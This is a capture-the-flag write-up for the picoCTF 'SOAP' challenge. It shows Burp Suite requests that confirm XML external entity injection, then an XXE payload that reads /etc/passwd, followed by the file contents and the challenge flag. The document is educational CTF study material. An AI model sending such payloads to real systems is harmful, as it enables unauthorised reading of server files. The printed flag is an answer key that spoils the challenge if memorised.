# picoGym Level 376: SOAP
Source: https://play.picoctf.org/practice/challenge/376

## Goal
The web project was rushed and no security assessment was done. <br>
Can you read the /etc/passwd file?<br>
Web Portal<br>
http://saturn.picoctf.net:58709/

## What I learned
```
XML external entity Injection
PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings ⭐⭐⭐⭐⭐
```             

## Solution
```
https://webshell.picoctf.org/

# View Page Source
<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">

    <title>PicoCTF</title>
  </head>
  <body>
  <section class="jumbotron text-center">
    <div class="container">
      <h1>Computer Science</h1>
      <p class="lead text-muted">We have been ranked to be among the best universities in the world!</p>
    </div>
  </section>
  <div class="album py-5 bg-light">
    <div class="container">
<div class="row">
        <div class="col-md-4">
          <div class="card mb-4 shadow-sm">
              <img src="/static/image2.png" class="bd-placeholder-img
              card-img-top" width="100%" height="225">
            <div class="card-body">
                <p class="card-text"><b>Carnegie Mellon  University Africa</b> Offers 3 masters degree programs.</p>
              <div class="d-flex justify-content-between align-items-center">
                <div class="btn-group">
                    <form class="detailForm" action="/data👀" method="POST">
                        <input required type="hidden" name="ID" value="1">
                  <button type="submit" class="btn btn-sm
                      btn-outline-secondary">Details</button>
                    </form>
                </div>
              </div>
            </div>
          </div>
        </div>

        <div class="col-md-4">
          <div class="card mb-4 shadow-sm">
              <img src="/static/image3.png" class="bd-placeholder-img
              card-img-top" width="100%" height="225">
            <div class="card-body">
                <p class="card-text"><b> PicoCTF </b>
                A free Computer Security education program.</p>
              <div class="d-flex justify-content-between align-items-center">
                <div class="btn-group">
                    <form class="detailForm" action="/data" method="POST">
                        <input required type="hidden" name="ID" value="2">
                  <button type="submit" class="btn btn-sm
                      btn-outline-secondary">Details</button>
                    </form>
                </div>
              </div>
            </div>
          </div>
        </div>

        <div class="col-md-4">
          <div class="card mb-4 shadow-sm">
              <img src="/static/image1.png" class="bd-placeholder-img
              card-img-top" width="100%" height="225">
            <div class="card-body">
                <p class="card-text"><b>Upanzi Network</b> an inititiave aimed at driving financial inclusion.</p>
              <div class="d-flex justify-content-between align-items-center">
                <div class="btn-group">
                    <form class="detailForm" action="/data" method="POST">
                        <input required type="hidden" name="ID" value="3">
                      <button type="submit" class="btn btn-sm
                      btn-outline-secondary">Details</button>
                    </form>
              </div>
              </div>
            </div>
          </div>
        </div>

      <span id="detailsResult"></span>

    </div>
</div>

  <script src="/static/js/xmlDetailsCheckPayload.js"></script> 👀
  <script src="/static/js/detailsCheck.js"></script> 👀
    <!-- Optional JavaScript -->

    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
  </body>
</html>

Browser: view-source:http://saturn.picoctf.net:58709/static/js/xmlDetailsCheckPayload.js ⌨️
window.contentType = 'application/xml';

function payload(data) {
    var xml = '<?xml version="1.0" encoding="UTF-8"?>';
    xml += '<data>';

    for(var pair of data.entries()) {
        var key = pair[0];
        var value = pair[1];

        xml += '<' + key + '>' + value + '</' + key + '>';
    }

    xml += '</data>';
    return xml;
}

Browser: view-source:http://saturn.picoctf.net:58709/static/js/detailsCheck.js ⌨️
document.querySelectorAll('.detailForm').forEach(item => {
    item.addEventListener("submit", function(e) {
        checkDetails(this.getAttribute("method"), this.getAttribute("action"), new FormData(this));
        e.preventDefault();
    });
});
function checkDetails(method, path, data) {
    const retry = (tries) => tries == 0
        ? null
        : fetch(
            path,
            {
                method,
                headers: { 'Content-Type': window.contentType },
                body: payload(data)
            }
          )
            .then(res => res.status == 200
                ? res.text().then(t => t)
                : "Could not find the details. Better luck next time :("
            )
            .then(res => document.getElementById("detailsResult").innerHTML = res)
            .catch(e => retry(tries - 1));

    retry(3);
}

# Burp Suite
Browser: http://saturn.picoctf.net:58709/ ⌨️
Proxy Intercept on
Broswer: click Details for a POST, Send to Repeater 👀
POST /data HTTP/1.1
Host: saturn.picoctf.net:58709
Content-Length: 61
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: http://saturn.picoctf.net:58709
Referer: http://saturn.picoctf.net:58709/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

<?xml version="1.0" encoding="UTF-8"?><data><ID>2</ID></data>

# Send gets normal response
HTTP/1.1 200 OK
Server: Werkzeug/2.3.6 Python/3.8.10
Date: Sat, 23 Aug 2025 03:16:11 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 73
Connection: close

<strong>Special Info::::</strong> Created By security and privacy experts

# Modify Request
POST /data HTTP/1.1
Host: saturn.picoctf.net:58709
Content-Length: 61
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: http://saturn.picoctf.net:58709
Referer: http://saturn.picoctf.net:58709/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

<?xml version="1.0" encoding="UTF-8"?>
<data>
    <ID>0👀</ID>
</data>

# Send and get Response
HTTP/1.1 200 OK
Server: Werkzeug/2.3.6 Python/3.8.10
Date: Sat, 23 Aug 2025 03:17:50 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 13
Connection: close

Invalid ID: 0 👀

# Check if XXE Vulnerable
# Request
POST /data HTTP/1.1
Host: saturn.picoctf.net:58709
Content-Length: 118
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: http://saturn.picoctf.net:58709
Referer: http://saturn.picoctf.net:58709/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY example "Joe"> ]> 👀
<data>
    <ID>&example;</ID> 👀
</data>

# Response
HTTP/1.1 200 OK
Server: Werkzeug/2.3.6 Python/3.8.10
Date: Sat, 23 Aug 2025 03:24:01 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 15
Connection: close

Invalid ID: Joe 👀 Yes XXE Vulnerable

# Use XXE Payload
# Request
POST /data HTTP/1.1
Host: saturn.picoctf.net:58709
Content-Length: 130
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: http://saturn.picoctf.net:58709
Referer: http://saturn.picoctf.net:58709/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]> 👀
<data>
    <ID>&test;</ID> 👀
</data>

# Response
HTTP/1.1 200 OK
Server: Werkzeug/2.3.6 Python/3.8.10
Date: Sat, 23 Aug 2025 03:27:13 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1023
Connection: close

Invalid ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
flask:x:999:999::/app:/bin/sh
picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_e5f02dbf} 🔐
```

## Flag
picoCTF{XML_3xtern@l_3nt1t1ty_e5f02dbf}

## Continue
[Continue](./picoGym0177.md)